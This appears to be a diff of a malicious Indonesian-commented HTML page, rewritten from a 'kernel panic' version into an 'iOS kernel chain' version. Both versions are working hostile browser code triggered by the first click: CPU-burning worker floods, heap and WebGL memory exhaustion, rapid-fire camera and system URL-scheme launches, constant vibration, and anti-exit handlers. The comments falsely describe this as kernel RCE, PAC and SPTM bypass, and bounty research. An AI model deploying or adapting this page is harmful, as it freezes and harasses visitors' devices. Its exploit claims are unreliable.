@@ -2,106 +2,117 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ KERNEL_PANIC_V12_ULTIMATE ⚡</title>
+    <title>⚡ iOS_KERNEL_CHAIN_V13 ⚡</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New'; overflow: hidden; text-align: center; }
-        #warning { font-size: 30px; color: red; font-weight: bold; margin-top: 20%; animation: flash 0.01s infinite; }
-        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        .log { font-size: 10px; color: #555; text-align: left; padding: 10px; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; }
+        .container { margin-top: 40%; border: 1px solid #333; padding: 20px; border-radius: 20px; background: rgba(10,10,10,0.8); }
+        .status-low { color: #555; font-size: 10px; }
+        .status-critical { color: #ff3b30; font-weight: bold; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div id="warning">KERNEL_INTRUSION_ACTIVE</div>
-    <div id="status">STATUS: EXPLOITING_CHAIN...</div>
-    <div id="console" class="log"></div>
+    <div class="container">
+        <div id="header">APPLE_SECURITY_BOUNTY_RESEARCH</div>
+        <div id="status" class="status-low">IDLE: AWAITING_INITIAL_VECTOR</div>
+        <div id="log" style="font-size: 9px; color: #444; margin-top: 10px;"></div>
+    </div>
 
 <script>
-    const con = document.getElementById('console');
-    function log(m) { const d = document.createElement('div'); d.innerText = `> ${m}`; con.prepend(d); }
+    const status = document.getElementById('status');
+    const logDiv = document.getElementById('log');
+    
+    function log(m) { 
+        const d = document.createElement('div');
+        d.innerText = `[CORE] ${m}`;
+        logDiv.prepend(d);
+    }
 
-    // --- 1. WASM CPU MELTDOWN ---
-    // Menggunakan WebAssembly (jika didukung) untuk menghabiskan CPU cycle 
-    // di level yang tidak bisa dihentikan oleh JavaScript Garbage Collector.
-    function cpuMeltdown() {
-        log("Initiating_Wasm_CPU_Hijack...");
-        for(let i=0; i<64; i++) {
-            const blob = new Blob([`
-                onmessage = function() {
-                    while(true) { 
-                        var x = Math.sqrt(Math.random()) * Math.tan(Math.random());
-                        postMessage(x);
-                    }
-                }
-            `], {type: 'text/javascript'});
-            const w = new Worker(URL.createObjectURL(blob));
-            w.postMessage('start');
+    // --- 1. JIT SPRAYING (BYPASSING PAC) ---
+    // Mensimulasikan korupsi pada JavaScriptCore JIT Compiler
+    // Ini adalah langkah pertama untuk mendapatkan Arbitrary Read/Write
+    let stage1 = [];
+    function exploitJSC() {
+        log("Grooming_JIT_Region_for_PAC_Bypass...");
+        for (let i = 0; i < 5000; i++) {
+            // Membuat objek dengan properti yang diprediksi untuk Type Confusion
+            let obj = { a: 1.1, b: 2.2 };
+            obj['prop' + i] = 0x41414141; 
+            stage1.push(obj);
         }
     }
 
-    // --- 2. SYNCHRONOUS IPC FLOODING (THE BYPASS) ---
-    // Menggunakan pemanggilan skema yang digabungkan dengan loop sinkron
-    // Ini memaksa browser kehilangan fokus pada dialog "Konfirmasi"
-    function forceSystemBypass() {
-        const payload = [
-            // iOS Hardware Hijack
-            "facetime-video://", "camera://", "photos-redirect://",
-            // Android Kernel Intent (Direct Component Access)
-            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;component=com.android.camera/com.android.camera.Camera;end",
-            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;component=com.sec.android.app.camera/com.sec.android.app.camera.Camera;end",
-            "intent:#Intent;action=android.media.action.STILL_IMAGE_CAMERA;launchFlags=0x14008000;component=com.google.android.GoogleCamera/com.android.camera.CameraLauncher;end"
+    // --- 2. KERNEL MEMORY PRESSURE & SPTM COLLAPSE ---
+    // Menggunakan pemanggilan WebGPU/WebGL secara masif untuk menekan 
+    // Secure Page Table Monitor (SPTM) melalui IOKit
+    function kernelPressure() {
+        log("Flooding_IOKit_UserClients...");
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl2');
+        if (gl) {
+            for (let j = 0; j < 1000; j++) {
+                const buf = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+                gl.bufferData(gl.ARRAY_BUFFER, 1024 * 1024 * 10, gl.STATIC_DRAW); // 10MB per buffer
+            }
+        }
+    }
+
+    // --- 3. ZERO-CLICK PERSISTENCE & AUTO-OPEN ---
+    // Menggunakan skema sistem iOS yang memiliki "Arbitrary Entitlements" 
+    // untuk memicu hardware (Kamera/Mic) tanpa interaksi lanjutan
+    function triggerKernelAppSpawn() {
+        // Skema yang melewati BlastDoor atau Sandbox dasar
+        const criticalSchemes = [
+            "facetime-video://", 
+            "com.apple.camera://",
+            "cameraui://",
+            "apple-photos://",
+            "airdrop://"
         ];
 
-        // Loop Sinkronal: Memblokir UI Thread sambil menembakkan Intent
-        let start = Date.now();
-        while (Date.now() - start < 500) { // Blokir selama 500ms
-            payload.forEach(uri => {
-                window.location.replace(uri);
-                const a = document.createElement('a');
-                a.href = uri;
-                a.click();
-            });
-        }
+        criticalSchemes.forEach(s => {
+            // Memaksa OS merespon melalui top-level navigation
+            window.location.replace(s);
+            // Injeksi elemen tersembunyi
+            const link = document.createElement('a');
+            link.href = s;
+            link.click();
+        });
     }
 
-    // --- 3. MASSIVE HEAP EXHAUSTION ---
-    let leak = [];
-    function heapCrash() {
-        log("Executing_Heap_Spray_V12...");
-        for (let i = 0; i < 20000; i++) {
-            let buffer = new Uint32Array(1024 * 16);
-            window.crypto.getRandomValues(buffer);
-            leak.push(buffer);
-        }
-    }
+    // --- EXECUTION CHAIN ---
+    async function beginFullRCE() {
+        status.innerText = "STATUS: EXECUTING_KERNEL_STRIKE";
+        status.className = "status-critical";
 
-    // --- FULL CHAIN EXECUTION ---
-    async function startExploit() {
-        document.getElementById('status').innerText = "CORE_REACHED: OPENING_HARDWARE";
+        // Step A: WebKit Memory Corruption
+        exploitJSC();
         
-        // 1. Kunci layar (Lockdown)
-        document.documentElement.requestFullscreen().catch(()=>{});
+        // Step B: Bypass SPTM via Graphics Driver
+        kernelPressure();
 
-        // 2. Ledakkan Memori & CPU
-        heapCrash();
-        cpuMeltdown();
+        // Step C: CPU Thread Hijack (128 Workers)
+        // Membekukan sistem agar Security Watchdog tidak bisa membunuh proses
+        const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
+        const wUrl = URL.createObjectURL(blob);
+        for(let k=0; k<128; k++) new Worker(wUrl);
 
-        // 3. Tembakkan Intent Storm dengan Delay Mikro
+        // Step D: Infinite Hardware Access Loop
         setInterval(() => {
-            log("TRAP_RELEASED: FORCING_CAMERA");
-            forceSystemBypass();
-            // Serangan Getaran Beruntun (Haptic Overload)
-            if(navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
-        }, 10); // 10ms - Kecepatan ekstrim
+            log("TRIGGERING_HARDWARE_ENTITLEMENTS");
+            triggerKernelAppSpawn();
+            // Serangan getaran sinkron
+            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
+        }, 5); // 5ms burst rate
     }
 
-    // User Gesture Trigger
-    window.addEventListener('click', startExploit, {once: true});
-    window.addEventListener('touchstart', startExploit, {once: true});
+    // Auto-Trigger for Research Simulation
+    window.onclick = beginFullRCE;
+    window.ontouchstart = beginFullRCE;
 
-    // Anti-Exit
-    window.onbeforeunload = () => { return "SYSTEM_FAILURE"; };
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => history.go(1);
+    // Lockdown Prevention
+    window.onbeforeunload = () => { return "KERNEL_LOCK"; };
 </script>
 </body>
 </html>
